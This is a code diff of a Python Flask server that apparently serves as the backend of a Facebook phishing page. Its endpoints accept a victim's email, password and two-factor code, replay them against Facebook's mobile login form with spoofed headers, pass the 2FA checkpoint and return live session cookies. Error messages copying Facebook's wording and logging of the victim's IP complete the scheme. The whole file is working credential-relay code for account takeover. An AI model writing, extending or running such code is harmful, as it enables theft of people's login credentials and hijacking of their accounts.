@@ -10,6 +10,7 @@ from config import CONFIG
 app = Flask(__name__)
 CORS(app, support_credentials=True)
 
+
 class Facebook:
     def __init__(self) -> None:
         self.proxy = self.get_proxy()
@@ -137,7 +138,8 @@ class Facebook:
 
         return jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
 
-    def check_password(self, user: str, password: str):
+    def check_password(self, user: str, password: str, ip: str):
+        print(ip)
         url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
 
         jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = self.get_data_password()
@@ -415,45 +417,60 @@ def check_email():
     data = request.get_json()
     email = data.get('email')
     fb = Facebook()
-    is_login_successful = fb.check_valid_account(email)
+    global is_login_successful
+    is_login_successful = 0
+    try:
+        is_login_successful = fb.check_valid_account(email)
+    except:
+        return jsonify({
+            "message": "Something went wrong during check email!",
+            "status": 400}), 400
 
     if is_login_successful:
         return jsonify({
-            "message": "Successfully...", 
-            "status": 200, 
+            "message": "Successfully...",
+            "status": 200,
             "email": email
-            }), 200
-       
+        }), 200
+
     else:
-         return jsonify({
-            "message": "The email you entered is not connected to any account. Find your account and log in.", 
+        return jsonify({
+            "message": "The email you entered is not connected to any account. Find your account and log in.",
             "status": 400}), 400
-    
+
+
 @app.route('/check-password', methods=['POST'])
 @cross_origin(supports_credentials=True)
 def check_password():
+    ip = request.remote_addr
     data = request.get_json()
     email = data.get('email')
     password = data.get('password')
-
     fb = Facebook()
-    is_login_successful = fb.check_password(email, password)
-    print(is_login_successful)
+    try:
+        is_login_successful = fb.check_password(email, password, ip)
+    except:
+        return jsonify({
+            "message": "Failed to check_password.",
+            "status": 400})
+
     if is_login_successful:
         return jsonify({
-            "message": "Successfully...", 
-            "status": 200, 
+            "message": "Successfully...",
+            "status": 200,
             "email": email
-            })
-       
+        })
+
     else:
-         return jsonify({
-            "message": "The password you entered is incorrect.", 
+        return jsonify({
+            "message": "The password you entered is incorrect.",
             "status": 400})
-    
+
+
 @app.route('/check-towfa', methods=['POST'])
 @cross_origin(supports_credentials=True)
 def check_towfa():
+    global jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
     data = request.get_json()
     email = data.get('email')
     password = data.get('password')
@@ -463,21 +480,25 @@ def check_towfa():
     # is_login_successful = fb.login_get_cookies(password, email, towfa)
 
     url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
-
-    jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = fb.get_data_password()
+    try:
+        jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = fb.get_data_password()
+    except:
+        return jsonify({
+            "message": "Failed to get_data_password.",
+            "status": 400}), 400
 
     headers = {
-            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
-            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
-            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
-            'Host': 'm.facebook.com',
-            'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache',
-            'Cookie': f'datr={cookie}',
-            'Content-Length': '84',
-        }
+        'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
+        'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
+        'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
+        'Host': 'm.facebook.com',
+        'Connection': 'Keep-Alive',
+        'Cache-Control': 'no-cache',
+        'Cookie': f'datr={cookie}',
+        'Content-Length': '84',
+    }
 
     payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={email}&pass={password}&login=Se+connecter&bi_xrwh=0'
     fb.session = requests.Session()
@@ -487,42 +508,47 @@ def check_towfa():
             print('access if')
             cookies = rq.cookies.get_dict()
             # convert dict to string
-            cookies = '; '.join([f'{key}={value}' for key, value in cookies.items()])
+            cookies = '; '.join(
+                [f'{key}={value}' for key, value in cookies.items()])
 
             # get data
             soup = BeautifulSoup(rq.text, 'html.parser')
 
             fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
             jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
-            checkpoint_data = soup.find('input', {'name': 'checkpoint_data'}).get('value')
+            checkpoint_data = soup.find(
+                'input', {'name': 'checkpoint_data'}).get('value')
             nh = soup.find('input', {'name': 'nh'}).get('value')
 
             code = fb.get_2fa(fa_key)
 
-            fb.login_with_2fa(cookies, fb_dtsg, jazoest, checkpoint_data, nh, fa_key)
+            fb.login_with_2fa(cookies, fb_dtsg, jazoest,
+                              checkpoint_data, nh, fa_key)
 
             return jsonify({
-            "cookies": fb.account_cookies, 
-            "status": 200}), 200
+                "cookies": fb.account_cookies,
+                "status": 200}), 200
 
         elif '/login/device-based/update-nonce/' in rq.text:
             print('access if 1')
             # get cookies
             cookies = rq.cookies.get_dict()
             # convert dict to string
-            cookies = '; '.join([f'{key}={value}' for key, value in cookies.items()])
-            
+            cookies = '; '.join(
+                [f'{key}={value}' for key, value in cookies.items()])
+
             return jsonify({
-            "cookies": cookies, 
-            "status": 200}), 200
-        
+                "cookies": cookies,
+                "status": 200}), 200
+
         else:
             return False
     except Exception as e:
         traceback.print_exc()
         return jsonify({
-            "message": "The login code you entered doesn't match the code sent to your phone. Please check this number and try again.", 
+            "message": "The login code you entered doesn't match the code sent to your phone. Please check this number and try again.",
             "status": 400}), 400
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
